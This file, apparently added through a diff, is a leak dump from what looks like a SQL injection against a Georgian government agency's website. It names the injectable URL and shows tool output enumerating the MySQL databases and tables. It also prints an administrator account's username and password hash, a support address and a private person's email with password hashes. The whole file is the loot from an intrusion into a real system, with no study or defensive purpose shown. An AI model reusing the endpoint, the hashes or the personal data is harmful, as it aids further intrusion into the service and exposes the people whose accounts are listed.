@@ -1,0 +1,58 @@
+.gov Government
+
+.ge Georgia
+
+State Ownership National Agency
+
+http://nasp.gov.ge/pages/project.php?id=7
+
+web application technology: Apache
+
+the back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+
+available databases [2]:                                                                                                                                             
+[+] information_schema
+[+] new_nasp_db1
+
+Database: new_nasp_db1                                                                                                                                               
+[19 tables]
++--------------------------------+
+| acarmoe                        |
+| admins                         |
+| answer_collection              |
+| answers                        |
+| collections                    |
+| inventorization                |
+| mirrormx_customer_chat_data    |
+| mirrormx_customer_chat_message |
+| mirrormx_customer_chat_user    |
+| page_attachment                |
+| page_content                   |
+| pages                          |
+| post_attachment                |
+| posts                          |
+| projects                       |
+| questions                      |
+| regions                        |
+| showslide                      |
+| slides                         |
++--------------------------------+
+
+Database: new_nasp_db1
+Table: admins
+[1 entry]
++-----------+----------------------------------+
+| username  | password                         |
++-----------+----------------------------------+
+| developer | 5d652069049726e9756b0cec400fa73e |
++-----------+----------------------------------+
+
+Database: new_nasp_db1
+Table: mirrormx_customer_chat_user
+[2 entries]
++-----------------+---------------------+------------------------------------------+
+| name            | mail                | password                                 |
++-----------------+---------------------+------------------------------------------+
+| support         | support@nasp.gov.ge | 66bea87cd2286075e21e9a24748039a398f225de |
+| vaja-1466692210 | vajasin@gmail.com   | x                                        |
++-----------------+---------------------+------------------------------------------+
